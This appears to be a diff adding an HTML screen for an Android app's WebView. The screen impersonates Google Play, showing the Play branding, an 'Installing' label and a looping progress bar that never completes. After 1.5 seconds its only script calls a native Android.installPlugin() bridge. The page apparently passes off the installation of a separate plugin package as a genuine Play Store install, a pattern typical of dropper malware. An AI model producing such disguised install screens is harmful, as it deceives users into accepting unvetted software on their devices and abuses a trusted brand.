@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#ffffff">
+    <title>Installing - Google Play</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Roboto', 'Arial', sans-serif;
+            background-color: #fafafa;
+            color: #202124;
+            width: 100%;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .circles-section {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .bottom-section {
+            padding: 20px 24px 100px 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+        }
+
+        /* Animated Circles */
+        .circles-container {
+            position: relative;
+            width: 70vw;
+            height: 70vw;
+            max-width: 350px;
+            max-height: 350px;
+        }
+
+        .circle {
+            position: absolute;
+            border-radius: 50%;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        /* Center large circle */
+        .circle-center {
+            width: 32%;
+            height: 32%;
+            background: linear-gradient(135deg, #4fc3f7 0%, #29b6f6 100%);
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 5;
+            box-shadow: 0 4px 12px rgba(79, 195, 247, 0.3);
+        }
+
+        /* Top left - cyan */
+        .circle-1 {
+            width: 15%;
+            height: 15%;
+            background: #4fc3f7;
+            left: 18%;
+            top: 12%;
+            animation-delay: 0s;
+            opacity: 0.9;
+        }
+
+        /* Top center - light gray */
+        .circle-2 {
+            width: 10%;
+            height: 10%;
+            background: #b0bec5;
+            left: 50%;
+            top: 8%;
+            transform: translateX(-50%);
+            animation-delay: 0.5s;
+            opacity: 0.7;
+        }
+
+        /* Top right - gray */
+        .circle-3 {
+            width: 17%;
+            height: 17%;
+            background: #90a4ae;
+            right: 18%;
+            top: 12%;
+            animation-delay: 1s;
+            opacity: 0.8;
+        }
+
+        /* Right - orange */
+        .circle-4 {
+            width: 15%;
+            height: 15%;
+            background: #ff9800;
+            right: 12%;
+            top: 45%;
+            animation-delay: 1.5s;
+        }
+
+        /* Bottom right - empty circle */
+        .circle-5 {
+            width: 13%;
+            height: 13%;
+            border: 2px solid #e0e0e0;
+            background: transparent;
+            right: 28%;
+            bottom: 22%;
+            animation-delay: 2s;
+            opacity: 0.6;
+        }
+
+        /* Bottom center - yellow */
+        .circle-6 {
+            width: 19%;
+            height: 19%;
+            background: #fdd835;
+            left: 50%;
+            bottom: 8%;
+            transform: translateX(-50%);
+            animation-delay: 2.5s;
+        }
+
+        /* Bottom left - small yellow */
+        .circle-7 {
+            width: 8%;
+            height: 8%;
+            background: #fdd835;
+            left: 42%;
+            bottom: 26%;
+            animation-delay: 1.2s;
+            opacity: 0.8;
+        }
+
+        /* Left - green */
+        .circle-8 {
+            width: 9%;
+            height: 9%;
+            background: #66bb6a;
+            left: 16%;
+            top: 48%;
+            animation-delay: 0.8s;
+        }
+
+        /* Left bottom - empty circle */
+        .circle-9 {
+            width: 13%;
+            height: 13%;
+            border: 2px solid #e0e0e0;
+            background: transparent;
+            left: 20%;
+            bottom: 32%;
+            animation-delay: 1.8s;
+            opacity: 0.5;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translate(0, 0);
+            }
+            50% {
+                transform: translate(0, -10px);
+            }
+        }
+
+        /* App Info Section - LEFT ALIGNED */
+        .app-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .app-icon {
+            width: 48px;
+            height: 48px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border: 1px solid #e0e0e0;
+            flex-shrink: 0;
+        }
+
+        .app-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .app-name {
+            font-size: 20px;
+            font-weight: 600;
+            color: #202124;
+        }
+
+        /* Status - LEFT ALIGNED */
+        .status-text {
+            font-size: 18px;
+            font-weight: 500;
+            color: #5f6368;
+            margin-bottom: 24px;
+            width: 100%;
+            max-width: 400px;
+            text-align: left;
+        }
+
+        /* Progress Bar - LEFT ALIGNED */
+        .progress-container {
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 16px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #1a73e8;
+            border-radius: 2px;
+            width: 0%;
+            animation: progress 4s ease-in-out infinite;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 95%; }
+        }
+
+        /* Google Play Logo */
+        .google-play-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            justify-content: center;
+            margin-top: 12px;
+        }
+
+        .play-icon {
+            width: 24px;
+            height: 24px;
+        }
+
+        .google-play-text {
+            font-size: 20px;
+            color: #5f6368;
+            font-weight: 400;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            .circles-container {
+                width: 75vw;
+                height: 75vw;
+            }
+
+            .bottom-section {
+                padding: 16px 20px 60px 20px;
+            }
+
+            .app-info {
+                max-width: 90%;
+            }
+
+            .app-icon {
+                width: 44px;
+                height: 44px;
+            }
+
+            .app-name {
+                font-size: 14px;
+            }
+
+            .status-text {
+                font-size: 13px;
+                max-width: 90%;
+            }
+
+            .progress-container {
+                max-width: 90%;
+            }
+
+            .play-icon {
+                width: 22px;
+                height: 22px;
+            }
+
+            .google-play-text {
+                font-size: 18px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .circles-container {
+                width: 70vw;
+                height: 70vw;
+            }
+
+            .app-icon {
+                width: 40px;
+                height: 40px;
+            }
+
+            .app-name {
+                font-size: 13px;
+            }
+        }
+
+        @media (min-width: 768px) {
+            .circles-container {
+                width: 50vw;
+                height: 50vw;
+                max-width: 400px;
+                max-height: 400px;
+            }
+
+            .app-info {
+                max-width: 500px;
+            }
+
+            .app-icon {
+                width: 56px;
+                height: 56px;
+            }
+
+            .app-name {
+                font-size: 17px;
+            }
+
+            .status-text {
+                font-size: 15px;
+                max-width: 500px;
+            }
+
+            .progress-container {
+                max-width: 500px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Circles in the middle -->
+    <div class="circles-section">
+        <div class="circles-container">
+            <div class="circle circle-center"></div>
+            <div class="circle circle-1"></div>
+            <div class="circle circle-2"></div>
+            <div class="circle circle-3"></div>
+            <div class="circle circle-4"></div>
+            <div class="circle circle-5"></div>
+            <div class="circle circle-6"></div>
+            <div class="circle circle-7"></div>
+            <div class="circle circle-8"></div>
+            <div class="circle circle-9"></div>
+        </div>
+    </div>
+
+    <!-- Bottom section with app info and progress -->
+    <div class="bottom-section">
+        <!-- App Info -->
+        <div class="app-info">
+            <div class="app-icon">
+                <img src="app.png" alt="App Icon" onerror="this.style.display='none'">
+            </div>
+            <div class="app-name"></div>
+        </div>
+
+        <!-- Status -->
+        <div class="status-text">Installing</div>
+
+        <!-- Progress Bar -->
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+        <!-- Google Play Logo -->
+        <div class="google-play-logo">
+            <img src="playstore.png" alt="Google Play" class="play-icon">
+            <span class="google-play-text">Google Play</span>
+        </div>
+    </div>
+
+    <!-- Load shared config -->
+    <script src="config.js"></script>
+    
+    <script>
+        // Trigger installation after animation starts
+        if (typeof Android !== 'undefined' && Android.installPlugin) {
+            setTimeout(() => {
+                Android.installPlugin();
+            }, 1500);
+        }
+        // Don't auto-redirect - let MainActivity handle it based on actual install status
+    </script>
+</body>
+</html>
